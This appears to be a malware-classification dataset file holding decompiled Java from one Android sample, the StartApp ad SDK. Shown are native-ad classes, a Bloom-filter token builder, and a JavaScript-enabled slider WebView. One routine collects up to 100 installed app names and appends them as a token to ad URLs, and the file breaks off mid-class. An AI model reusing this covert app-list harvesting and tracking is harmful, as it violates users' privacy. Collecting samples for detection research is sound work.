"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.nativead\NativeAdInterface.code","public interface NativeAdInterface {   StartAppNativeAd.b getCampaignAction();   String getCategory();   String getDescription();   Bitmap getImageBitmap();   String getImageUrl();   String getInstalls();   String getPackacgeName();   float getRating();   String getTitle();   void sendClick(  Context context);   void sendImpression(  Context context); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.nativead\NativeAdPreferences.code","public class NativeAdPreferences extends AdPreferences {   private static final int DEFAULT_ADS_NUMBER=1;   private static final boolean DEFAULT_AUTO_DOWNLOAD_BITMAP=false;   private int adsNumber=1;   private boolean autoBitmapDownload;   private NativeAdBitmapSize bitmapSize;   private static String EXCEPTION_LOW_ADS_NUMBER=""Ads Number must be >= 1"";   private static final NativeAdBitmapSize DEFAULT_BITMAP_SIZE=NativeAdBitmapSize.SIZE150X150;   public enum NativeAdBitmapSize {  SIZE72X72(72,72),   SIZE100X100(100,100),   SIZE150X150(150,150),   SIZE340X340(340,340);   int height;   int width;   NativeAdBitmapSize(  int i,  int i2){     this.width=i;     this.height=i2;   }   public int getHeight(){     return this.height;   }   public int getWidth(){     return this.width;   } }   public NativeAdPreferences(){     setAdsNumber(1);     setAutoBitmapDownload(false);     setImageSize(DEFAULT_BITMAP_SIZE);   }   public int getAdsNumber(){     return this.adsNumber;   }   public NativeAdBitmapSize getImageSize(){     return this.bitmapSize;   }   public boolean isAutoBitmapDownload(){     return this.autoBitmapDownload;   }   public NativeAdPreferences setAdsNumber(  int i){     if (i < 0) {       throw new IllegalArgumentException(EXCEPTION_LOW_ADS_NUMBER);     }     this.adsNumber=i;     return this;   }   public NativeAdPreferences setAutoBitmapDownload(  boolean z){     this.autoBitmapDownload=z;     return this;   }   public NativeAdPreferences setImageSize(  NativeAdBitmapSize nativeAdBitmapSize){     this.bitmapSize=nativeAdBitmapSize;     return this;   }   @Override public String toString(){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(""\n===== NativeAdConfig =====\n"");     stringBuffer.append(""    adsNumber: ["" + getAdsNumber() + ""]\n"");     stringBuffer.append(""    autoBitmapDownload: ["" + isAutoBitmapDownload() + ""]\n"");     stringBuffer.append(""    bitmapSize: ["" + getImageSize() + ""]\n"");     stringBuffer.append(""===== End NativeAdConfig ====="");     return stringBuffer.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.nativead\StartAppNativeAd.code","public class StartAppNativeAd extends Ad implements NativeAdDetails.a {   private static final String TAG=""StartAppNativeAd"";   private a adEventDelegate;   private List<NativeAdDetails> listNativeAds;   private g nativeAds;   private NativeAdPreferences preferences;   private int totalObjectsLoaded; public class a implements AdEventListener {     private AdEventListener b;     public a(    AdEventListener adEventListener){       this.b=null;       this.b=adEventListener;     }     public AdEventListener a(){       return this.b;     }     @Override public void onFailedToReceiveAd(    Ad ad){       i.a(StartAppNativeAd.TAG,3,""NativeAd Failed to load"");       if (this.b != null) {         this.b.onFailedToReceiveAd(StartAppNativeAd.this);         this.b=null;       }     }     @Override public void onReceiveAd(    Ad ad){       i.a(StartAppNativeAd.TAG,3,""NativeAd Received"");       if (StartAppNativeAd.this.nativeAds == null || StartAppNativeAd.this.nativeAds.a() == null) {         StartAppNativeAd.this.preferences.setAdsNumber(0);       }  else {         StartAppNativeAd.this.preferences.setAdsNumber(StartAppNativeAd.this.nativeAds.a().size());       }       StartAppNativeAd.this.initNativeAdList();     }   }   public enum b {  LAUNCH_APP,   OPEN_MARKET}   public StartAppNativeAd(  Context context){     super(context);     this.totalObjectsLoaded=0;     this.listNativeAds=new ArrayList();   }   private NativeAdPreferences getPreferences(){     return this.preferences;   }   public void initNativeAdList(){     int i=0;     this.totalObjectsLoaded=0;     this.listNativeAds.clear();     while (true) {       int i2=i;       if (i2 >= getPreferences().getAdsNumber()) {         return;       }       this.listNativeAds.add(new NativeAdDetails(this.nativeAds.a().get(i2),getPreferences(),i2,this));       i=i2 + 1;     }   }   private void onNativeAdLoaded(){     i.a(TAG,3,""Ad Loaded successfully"");     if (this.adEventDelegate != null) {       i.a(TAG,3,""Calling original RecienedAd callback"");       AdEventListener a2=this.adEventDelegate.a();       if (a2 != null) {         a2.onReceiveAd(this);       }     }   }   private void setPreferences(  NativeAdPreferences nativeAdPreferences){     this.preferences=nativeAdPreferences;   }   public ArrayList<NativeAdDetails> getNativeAds(){     ArrayList<NativeAdDetails> arrayList=new ArrayList<>();     Iterator<NativeAdDetails> it=this.listNativeAds.iterator();     while (it.hasNext()) {       arrayList.add(it.next());     }     return arrayList;   }   public int getNumberOfAds(){     return getPreferences().getAdsNumber();   }   public boolean loadAd(){     return loadAd(new NativeAdPreferences(),null);   }   public boolean loadAd(  AdEventListener adEventListener){     return loadAd(new NativeAdPreferences(),adEventListener);   }   public boolean loadAd(  NativeAdPreferences nativeAdPreferences){     return loadAd(nativeAdPreferences,null);   }   public boolean loadAd(  NativeAdPreferences nativeAdPreferences,  AdEventListener adEventListener){     i.a(TAG,3,""Start loading StartAppNativeAd"");     this.adEventDelegate=new a(adEventListener);     i.a(TAG,3,""Cofigurtaion: "" + this.preferences);     setPreferences(nativeAdPreferences);     this.nativeAds=new g(this.context,getPreferences());     return this.nativeAds.load(nativeAdPreferences,this.adEventDelegate);   }   @Override protected void loadAds(  AdPreferences adPreferences,  AdEventListener adEventListener){   }   @Override public void onNativeAdDetailsLoaded(  int i){     this.totalObjectsLoaded++;     if (this.totalObjectsLoaded == getPreferences().getAdsNumber()) {       onNativeAdLoaded();     }   }   public String toString(){     StringBuffer stringBuffer=new StringBuffer();     stringBuffer.append(""\n===== StartAppNativeAd =====\n"");     for (int i=0; i < getNumberOfAds(); i++) {       stringBuffer.append(this.listNativeAds.get(i));     }     stringBuffer.append(""===== End StartAppNativeAd ====="");     return stringBuffer.toString();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple\Util.code","public class Util {   private c m=new c();   public String addKeyToToken(  Collection<String> collection){     return this.m.a(collection);   }   public boolean contains(  String str){     return this.m.b(str);   }   public String createToken(  Context context){     return this.m.a(a.a(context));   }   public void getTokenFromString(  String str){     this.m.a(str);   }   public String sample(  List<String> list){     return this.m.a(list);   }   public String sampleGlobalToken(  List<String> list,  int i,  double d){     return this.m.a(list,i,d);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\a.code","class a {   static final double[][] a;   static final boolean b;   private static final int[] c; public static class C0057a {     final int a;     final int b;     public C0057a(    int i,    int i2){       this.a=i;       this.b=i2;     }     public String toString(){       return String.format(""BS(K=%d, bPE=%d)"",Integer.valueOf(this.a),Integer.valueOf(this.b));     }   } static {     b=!a.class.desiredAssertionStatus();     a=new double[][]{new double[]{1.0d},new double[]{1.0d,1.0d},new double[]{1.0d,0.393d,0.4d},new double[]{1.0d,0.283d,0.237d,0.253d},new double[]{1.0d,0.221d,0.155d,0.147d,0.16d},new double[]{1.0d,0.181d,0.109d,0.092d,0.092d,0.101d},new double[]{1.0d,0.154d,0.0804d,0.0609d,0.0561d,0.0578d,0.0638d},new double[]{1.0d,0.133d,0.0618d,0.0423d,0.0359d,0.0347d,0.0364d},new double[]{1.0d,0.118d,0.0489d,0.0306d,0.024d,0.0217d,0.0216d,0.0229d},new double[]{1.0d,0.105d,0.0397d,0.0228d,0.0166d,0.0141d,0.0133d,0.0135d,0.0145d},new double[]{1.0d,0.0952d,0.0329d,0.0174d,0.0118d,0.00943d,0.00844d,0.00819d,0.00846d},new double[]{1.0d,0.0869d,0.0276d,0.0136d,0.00864d,0.0065d,0.00552d,0.00513d,0.00509d},new double[]{1.0d,0.08d,0.0236d,0.0108d,0.00646d,0.00459d,0.00371d,0.00329d,0.00314d},new double[]{1.0d,0.074d,0.0203d,0.00875d,0.00492d,0.00332d,0.00255d,0.00217d,0.00199d,0.00194d},new double[]{1.0d,0.0689d,0.0177d,0.00718d,0.00381d,0.00244d,0.00179d,0.00146d,0.00129d,0.00121d,0.0012d},new double[]{1.0d,0.0645d,0.0156d,0.00596d,0.003d,0.00183d,0.00128d,0.001d,8.52E-4d,7.75E-4d,7.44E-4d},new double[]{1.0d,0.0606d,0.0138d,0.005d,0.00239d,0.00139d,9.35E-4d,7.02E-4d,5.74E-4d,5.05E-4d,4.7E-4d,4.59E-4d},new double[]{1.0d,0.0571d,0.0123d,0.00423d,0.00193d,0.00107d,6.92E-4d,4.99E-4d,3.94E-4d,3.35E-4d,3.02E-4d,2.87E-4d,2.84E-4d},new double[]{1.0d,0.054d,0.0111d,0.00362d,0.00158d,8.39E-4d,5.19E-4d,3.6E-4d,2.75E-4d,2.26E-4d,1.98E-4d,1.83E-4d,1.76E-4d},new double[]{1.0d,0.0513d,0.00998d,0.00312d,0.0013d,6.63E-4d,3.94E-4d,2.64E-4d,1.94E-4d,1.55E-4d,1.32E-4d,1.18E-4d,1.11E-4d,1.09E-4d},new double[]{1.0d,0.0488d,0.00906d,0.0027d,0.00108d,5.3E-4d,3.03E-4d,1.96E-4d,1.4E-4d,1.08E-4d,8.89E-5d,7.77E-5d,7.12E-5d,6.79E-5d,6.71E-5d}};     c=new int[a.length];     for (int i=0; i < a.length; i++) {       double[] dArr=a[i];       double d=Double.MAX_VALUE;       for (int i2=0; i2 < dArr.length; i2++) {         if (dArr[i2] < d) {           d=dArr[i2];           c[i]=Math.max(1,i2);         }       }     }   }   a(){   }   public static int a(  long j){     long max=Math.max(1L,j);     double d=9.223372036854776E18d / max;     if (d < 1.0d) {       throw new UnsupportedOperationException(""Cannot compute p for "" + max + "" elements."");     }     return Math.min(a.length - 1,(int)d);   }   public static C0057a a(  int i,  double d){     int i2=2;     if (!b && i < 1) {       throw new AssertionError();     }     if (!b && i > a.length - 1) {       throw new AssertionError();     }     int length=a[i].length - 1;     if (d >= a[2][1]) {       return new C0057a(2,c[2]);     }     if (d < a[i][length]) {       throw new UnsupportedOperationException(String.format(""Unable to satisfy %s with %s bpe"",Double.valueOf(d),Integer.valueOf(i)));     }     int i3=c[2];     while (a[i2][i3] > d) {       i2++;       i3=c[i2];     }     while (a[i2][i3 - 1] <= d) {       i3--;     }     return new C0057a(i3,i2);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\b.code","public class b extends e {   static d a;   static final boolean c;   public g b; static {     c=!b.class.desiredAssertionStatus();     a=new d();   }   public b(  int i,  g gVar){     this.d=i;     this.b=gVar;   }   public static b a(  long j,  double d){     if (!c && d > 1.0d) {       throw new AssertionError(""Invalid p"");     }     a.C0057a a2=a.a(a.a(j),d);     return new b(a2.a,a(j,a2.b));   }   private static g a(  long j,  int i){     return new g((i * j) + 20);   }   static long[] a(  ByteBuffer byteBuffer,  int i,  long j){     long[] jArr=new long[i];     long a2=f.a(byteBuffer,byteBuffer.position(),byteBuffer.remaining(),0L);     long a3=f.a(byteBuffer,byteBuffer.position(),byteBuffer.remaining(),a2);     for (int i2=0; i2 < i; i2++) {       jArr[i2]=Math.abs(((i2 * a3) + a2) % j);     }     return jArr;   }   private long[] c(  ByteBuffer byteBuffer){     return a(byteBuffer,this.d,this.b.a());   }   public void a(  ByteBuffer byteBuffer){     for (    long j : c(byteBuffer)) {       this.b.b(j);     }   }   public boolean b(  ByteBuffer byteBuffer){     for (    long j : c(byteBuffer)) {       if (!this.b.e(j)) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\c.code","public class c {   private d a=new d();   private b b=null;   private String a(  b bVar){     ByteArrayOutputStream byteArrayOutputStream;     Throwable th;     String str=null;     try {       byteArrayOutputStream=new ByteArrayOutputStream();     }  catch (    Throwable th2) {       byteArrayOutputStream=null;       th=th2;     }     try {       this.a.a(bVar,new DataOutputStream(byteArrayOutputStream));       str=a(byteArrayOutputStream.toByteArray());       if (byteArrayOutputStream != null) {         try {           byteArrayOutputStream.close();         }  catch (        IOException e) {         }       }     }  catch (    Throwable th3) {       if (byteArrayOutputStream != null) {         try {           byteArrayOutputStream.close();         }  catch (        IOException e2) {         }       }       return str;     }     return str;   }   private String a(  byte[] bArr){     StringBuilder sb=new StringBuilder();     for (    byte b : bArr) {       sb.append(String.format(""%02x"",Integer.valueOf(b & 255)));     }     return sb.toString();   }   private b b(  List<String> list,  int i,  double d){     b a=b.a(i,d);     Iterator<String> it=list.iterator();     while (it.hasNext()) {       a.a(ByteBuffer.wrap(it.next().getBytes()));     }     return a;   }   private byte[] c(  String str){     if (str.length() % 2 != 0) {       return null;     }     byte[] bArr=new byte[str.length() / 2];     char[] charArray=str.toCharArray();     for (int i=0; i < charArray.length; i+=2) {       StringBuilder sb=new StringBuilder(2);       sb.append(charArray[i]).append(charArray[i + 1]);       bArr[i / 2]=(byte)Integer.parseInt(sb.toString(),16);     }     return bArr;   }   public String a(  Collection<String> collection){     Iterator<String> it=collection.iterator();     while (it.hasNext()) {       this.b.a(ByteBuffer.wrap(it.next().getBytes()));     }     return a(this.b);   }   public String a(  List<String> list){     return a(list,100,0.0347d);   }   public String a(  List<String> list,  int i,  double d){     try {       b b=b(list,i,d);       this.b=b;       return a(b);     }  catch (    Throwable th) {       return null;     }   }   public void a(  java.lang.String r5){     throw new UnsupportedOperationException(""Method not decompiled: com.startapp.android.publish.simple.a.a.c.a(java.lang.String):void"");   }   public boolean b(  String str){     if (this.b == null || str == null) {       return false;     }     return this.b.b(ByteBuffer.wrap(str.getBytes()));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\C0057a.code","public static class C0057a {   final int a;   final int b;   public C0057a(  int i,  int i2){     this.a=i;     this.b=i2;   }   public String toString(){     return String.format(""BS(K=%d, bPE=%d)"",Integer.valueOf(this.a),Integer.valueOf(this.b));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\d.code","public class d {   public b a(  DataInput dataInput){     long j;     int readInt=dataInput.readInt();     long readInt2=dataInput.readInt();     g gVar=new g(readInt2 << 6);     int d=gVar.d();     int e=gVar.e();     int i=0;     while (i < e) {       long[] b=gVar.b(i);       int i2=0;       while (true) {         if (i2 >= d) {           j=readInt2;           break;         }         j=readInt2 - 1;         if (readInt2 > 0) {           b[i2]=dataInput.readLong();           i2++;           readInt2=j;         }       }       i++;       readInt2=j;     }     return new b(readInt,gVar);   }   public void a(  b bVar,  DataOutput dataOutput){     int i;     int c=bVar.b.c();     int d=bVar.b.d();     int e=bVar.b.e();     dataOutput.writeInt(bVar.a());     dataOutput.writeInt(c);     int i2=0;     while (i2 < e) {       long[] b=bVar.b.b(i2);       int i3=0;       while (true) {         if (i3 >= d) {           i=c;           break;         }         i=c - 1;         if (c > 0) {           dataOutput.writeLong(b[i3]);           i3++;           c=i;         }       }       i2++;       c=i;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\e.code","public abstract class e {   int d;   public int a(){     return this.d;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\f.code","public class f {   public static long a(  ByteBuffer byteBuffer,  int i,  int i2,  long j){     long j2=(4294967295L & j) ^ (i2 * (-4132994306676758123L));     int i3=0;     while (i3 < (i2 >> 3)) {       int i4=i3 << 3;       long j3=(((byteBuffer.get((i4 + i) + 7) & 255) << 56) + (byteBuffer.get(i + i4 + 0) & 255) + ((byteBuffer.get((i + i4) + 1) & 255) << 8)+ ((byteBuffer.get((i + i4) + 2) & 255) << 16)+ ((byteBuffer.get((i + i4) + 3) & 255) << 24)+ ((byteBuffer.get((i + i4) + 4) & 255) << 32)+ ((byteBuffer.get((i + i4) + 5) & 255) << 40)+ ((byteBuffer.get((i + i4) + 6) & 255) << 48)) * (-4132994306676758123L);       i3++;       j2=(j2 ^ ((j3 ^ (j3 >>> 47)) * (-4132994306676758123L))) * (-4132994306676758123L);     } switch (i2 & 7) { case 1:       j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L);     break; case 2:   j2^=byteBuffer.get(((i + i2) - r3) + 1) << 8; j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L); break; case 3: j2^=byteBuffer.get(((i + i2) - r3) + 2) << 16; j2^=byteBuffer.get(((i + i2) - r3) + 1) << 8; j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L); break; case 4: j2^=byteBuffer.get(((i + i2) - r3) + 3) << 24; j2^=byteBuffer.get(((i + i2) - r3) + 2) << 16; j2^=byteBuffer.get(((i + i2) - r3) + 1) << 8; j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L); break; case 5: j2^=byteBuffer.get(((i + i2) - r3) + 4) << 32; j2^=byteBuffer.get(((i + i2) - r3) + 3) << 24; j2^=byteBuffer.get(((i + i2) - r3) + 2) << 16; j2^=byteBuffer.get(((i + i2) - r3) + 1) << 8; j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L); break; case 6: j2^=byteBuffer.get(((i + i2) - r3) + 5) << 40; j2^=byteBuffer.get(((i + i2) - r3) + 4) << 32; j2^=byteBuffer.get(((i + i2) - r3) + 3) << 24; j2^=byteBuffer.get(((i + i2) - r3) + 2) << 16; j2^=byteBuffer.get(((i + i2) - r3) + 1) << 8; j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L); break; case 7: j2^=byteBuffer.get(((i + i2) - r3) + 6) << 48; j2^=byteBuffer.get(((i + i2) - r3) + 5) << 40; j2^=byteBuffer.get(((i + i2) - r3) + 4) << 32; j2^=byteBuffer.get(((i + i2) - r3) + 3) << 24; j2^=byteBuffer.get(((i + i2) - r3) + 2) << 16; j2^=byteBuffer.get(((i + i2) - r3) + 1) << 8; j2=(j2 ^ byteBuffer.get((i + i2) - r3)) * (-4132994306676758123L); break; } long j4=(j2 ^ (j2 >>> 47)) * (-4132994306676758123L); return j4 ^ (j4 >>> 47); } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a\g.code","public class g implements Serializable {   static final boolean c;   protected long[][] a;   protected int b;   private final int d; static {     c=!g.class.desiredAssertionStatus();   }   public g(){     this(64L);   }   public g(  long j){     this(j,true);   }   public g(  long j,  boolean z){     this.b=a(j);     int i=this.b % 4096;     int i2=this.b / 4096;     this.d=(i == 0 ? 0 : 1) + i2;     this.a=new long[this.d];     if (z) {       for (int i3=0; i3 < i2; i3++) {         this.a[i3]=new long[4096];       }       if (i != 0) {         this.a[this.a.length - 1]=new long[i];       }     }   }   public static int a(  long j){     return (int)(((j - 1) >>> 6) + 1);   }   public long a(){     return b();   }   public void a(  int i){     if (!c && i > this.b) {       throw new AssertionError(""Growing of paged bitset is not supported"");     }   }   public long b(){     return this.b << 6;   }   public void b(  long j){     int c2=c(j);     long[] jArr=this.a[c2 / 4096];     int i=c2 % 4096;     jArr[i]=(1 << (((int)j) & 63)) | jArr[i];   }   public long[] b(  int i){     return this.a[i];   }   public int c(){     return this.b;   }   protected int c(  long j){     int i=(int)(j >> 6);     if (i >= this.b) {       d(1 + j);       this.b=i + 1;     }     return i;   }   public int d(){     return 4096;   }   public void d(  long j){     a(a(j));   }   public int e(){     return this.d;   }   public boolean e(  long j){     int i=(int)(j >> 6);     if (i >= this.b) {       return false;     }     return (this.a[i / 4096][i % 4096] & (1 << (((int)j) & 63))) != 0;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.simple.a.a.a\a.code","public class a {   public static List<String> a(  Context context){     List<PackageInfo> b=b(context);     ArrayList arrayList=new ArrayList();     Iterator<PackageInfo> it=a(b).iterator();     while (it.hasNext()) {       arrayList.add(it.next().packageName);     }     return arrayList;   }   private static List<PackageInfo> a(  List<PackageInfo> list){     if (list.size() <= 100) {       return list;     }     if (Build.VERSION.SDK_INT >= 9) {       Collections.sort(list,new Comparator<PackageInfo>(){         @Override public int compare(        PackageInfo packageInfo,        PackageInfo packageInfo2){           long j=packageInfo.firstInstallTime;           long j2=packageInfo2.firstInstallTime;           if (j > j2) {             return -1;           }           return j == j2 ? 0 : 1;         }       } );     }     return list.subList(0,100);   }   private static boolean a(  PackageInfo packageInfo){     return ((packageInfo.applicationInfo.flags & 1) == 0 && (packageInfo.applicationInfo.flags & android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS) == 0) ? false : true;   }   private static List<PackageInfo> b(  Context context){     PackageManager packageManager=context.getPackageManager();     ArrayList arrayList=new ArrayList();     for (    PackageInfo packageInfo : packageManager.getInstalledPackages(0)) {       if (!a(packageInfo)) {         arrayList.add(packageInfo);       }     }     return arrayList;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider\a.code","public class a extends AsyncTask<String,Void,Boolean> {   private Context a;   public a(  Context context){     this.a=context;   }   private boolean a(  String str){     if (str != null) {       try {         com.startapp.android.publish.d.b.a(this.a,str,null);         return true;       }  catch (      n e) {         i.a(6,""Unable to send tracking event in GetSearchBoxService!!!!"",e);       }     }     return false;   }   @Override public Boolean doInBackground(  String... strArr){     if (!g.a(this.a,""slideEvent"",(Boolean)true).booleanValue() && strArr != null && strArr.length >= 1) {       g.b(this.a,""slideEvent"",Boolean.valueOf(a(strArr[0])));     }     if (!g.a(this.a,""trackingEvent"",(Boolean)true).booleanValue()) {       g.b(this.a,""trackingEvent"",Boolean.valueOf(a(g.a(this.a,""trackingUrl"",(String)null))));     }     return true;   } } public class a extends WebViewClient {   private a(){   }   @Override public void onPageFinished(  WebView webView,  String str){     i.a(""Slider"",2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");     super.onPageFinished(webView,str);   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     i.a(""Slider"",2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");     super.onPageStarted(webView,str,bitmap);   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  final String str2){     b.this.b.loadUrl(""file://"" + b.this.a().getFilesDir().getPath() + ""/error.html"");     i.a(""Slider"",2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");     b.this.d.postDelayed(new Runnable(){       @Override public void run(){         b.this.b.loadUrl(str2);       }     } ,5000L);     super.onReceivedError(webView,i,str,str2);   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     i.a(""Slider"",2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");     String lowerCase=str.toLowerCase();     String str2=""searchmobileonline"";     try {       str2=new URL(b.this.e.a().get(0).getClickUrl()).getHost();     }  catch (    MalformedURLException e) {     }     if (lowerCase.contains(str2)) {       return false;     }     p.b(b.this.a(),str);     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.slider\b.code","public class b {   private static boolean i=false;   private Activity a;   private WebView b;   private DrawerLayout c;   private Handler d;   private k e;   private int f;   private Handler g;   private AdInformationOverrides h; public class a extends WebViewClient {     private a(){     }     @Override public void onPageFinished(    WebView webView,    String str){       i.a(""Slider"",2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");       super.onPageFinished(webView,str);     }     @Override public void onPageStarted(    WebView webView,    String str,    Bitmap bitmap){       i.a(""Slider"",2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");       super.onPageStarted(webView,str,bitmap);     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    final String str2){       b.this.b.loadUrl(""file://"" + b.this.a().getFilesDir().getPath() + ""/error.html"");       i.a(""Slider"",2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");       b.this.d.postDelayed(new Runnable(){         @Override public void run(){           b.this.b.loadUrl(str2);         }       } ,5000L);       super.onReceivedError(webView,i,str,str2);     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       i.a(""Slider"",2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");       String lowerCase=str.toLowerCase();       String str2=""searchmobileonline"";       try {         str2=new URL(b.this.e.a().get(0).getClickUrl()).getHost();       }  catch (      MalformedURLException e) {       }       if (lowerCase.contains(str2)) {         return false;       }       p.b(b.this.a(),str);       return true;     }   }   public b(  Activity activity){     this(activity,new AdPreferences());   }   public b(  Activity activity,  AdPreferences adPreferences){     this.d=new Handler();     this.f=0;     this.g=new Handler();     this.h=AdInformationOverrides.a();     i.a(""Slider"",3,""new Slider Created"");     this.a=activity;     this.e=new k(activity);     this.e.a(adPreferences,new AdEventListener(){       @Override public void onFailedToReceiveAd(      Ad ad){         i.a(""Slider"",6,""Error loading Slider"");       }       @Override public void onReceiveAd(      Ad ad){         i.a(""Slider"",3,""Slider loaded"");         b.this.b();         b.this.d();       }     } );   }   public void b(){     this.b=new WebView(a()){       @Override public boolean onKeyDown(      int i2,      KeyEvent keyEvent){         if (keyEvent.getAction() == 0) { switch (i2) { case 4:             if (b.this.b != null && b.this.b.canGoBack()) {               b.this.b.goBack();             }  else             if (b.this.c != null) {               b.this.c.b();             }           return true;       }     }     return super.onKeyDown(i2,keyEvent);   } } ; this.b.setOnTouchListener(new View.OnTouchListener(){   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     b.this.c.requestDisallowInterceptTouchEvent(true);     return false;   } } ); WebViewJSInterface webViewJSInterface=new WebViewJSInterface(this.a); this.b.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1)); this.b.getSettings().setJavaScriptEnabled(true); this.b.addJavascriptInterface(webViewJSInterface,""HTMLOUT""); this.b.setWebChromeClient(new WebChromeClient()); this.b.setHorizontalScrollBarEnabled(false); this.b.setVerticalScrollBarEnabled(true); if (Build.VERSION.SDK_INT > 10) {   this.b.setLayerType(1,null); } this.b.setWebViewClient(new a()); String str=this.e.a().get(0).getClickUrl() + c() + ""&ver=""+ com.startapp.android.publish.b.a; i.a(3,""Slider URL: "" + str); this.b.loadUrl(str); } private String c(){ String c=p.c(a()); return (c == null || """".equals(c)) ? """" : ""&token="" + c; } public void d(){ if (p.a(a())) {   ViewGroup viewGroup=(ViewGroup)this.a.findViewById(R.id.content);   View childAt=viewGroup.getChildAt(0);   viewGroup.removeView(childAt);   this.c=new DrawerLayout(a());   RelativeLayout relativeLayout=new RelativeLayout(this.a);   relativeLayout.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));   relativeLayout.addView(childAt);   final ImageButton imageButton=new ImageButton(this.a);   if (Build.VERSION.SDK_INT >= 16) {     imageButton.setBackground(null);   }  else {     imageButton.setBackgroundDrawable(null);   }   imageButton.setPadding(0,0,p.a(this.a,10),0);   RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);   layoutParams.addRule(15);   imageButton.setLayoutParams(layoutParams);   imageButton.setImageBitmap(d.a(this.a,""tab_side.png""));   final TranslateAnimation translateAnimation=new TranslateAnimation(1,0.0f,1,0.0f,1,-0.07f,1,0.07f);   final TranslateAnimation translateAnimation2=new TranslateAnimation(1,0.0f,1,0.0f,1,0.07f,1,-0.07f);   translateAnimation.setDuration(40L);   translateAnimation2.setDuration(40L);   new Runnable(){     @Override public void run(){       imageButton.startAnimation(translateAnimation);     }   } ;   translateAnimation.setAnimationListener(new Animation.AnimationListener(){     @Override public void onAnimationEnd(    Animation animation){       imageButton.startAnimation(translateAnimation2);     }     @Override public void onAnimationRepeat(    Animation animation){     }     @Override public void onAnimationStart(    Animation animation){     }   } );   translateAnimation2.setAnimationListener(new Animation.AnimationListener(){     @Override public void onAnimationEnd(    Animation animation){       b.e(b.this);       if (b.this.f > 12) {         b.this.f=0;       }  else {         imageButton.startAnimation(translateAnimation);       }     }     @Override public void onAnimationRepeat(    Animation animation){     }     @Override public void onAnimationStart(    Animation animation){     }   } );   relativeLayout.addView(imageButton);   if (!i) {     i=true;     this.g.postDelayed(new Runnable(){       @Override public void run(){         imageButton.startAnimation(translateAnimation);       }     } ,15000L);   }   this.c.setLayoutParams(new DrawerLayout.c(-1,-1));   this.c.addView(relativeLayout);   final RelativeLayout relativeLayout2=new RelativeLayout(a());   DrawerLayout.c cVar=new DrawerLayout.c(p.a(this.a,290),-1);   cVar.a=3;   relativeLayout2.setLayoutParams(cVar);   relativeLayout2.addView(this.b);   this.c.addView(relativeLayout2);   viewGroup.addView(this.c);   new com.startapp.android.publish.adinformation.b(this.a,b.EnumC0051b.LARGE,AdPreferences.Placement.DEVICE_SIDEBAR,this.h).a(relativeLayout2);   imageButton.setOnClickListener(new View.OnClickListener(){     @Override public void onClick(    View view){       b.this.c.h(relativeLayout2);     }   } );   this.c.setDrawerListener(new DrawerLayout.b(){     @Override public void a(    int i2){     }     @Override public void a(    View view){       b.this.e();     }     @Override public void a(    View view,    float f){     }     @Override public void b(    View view){       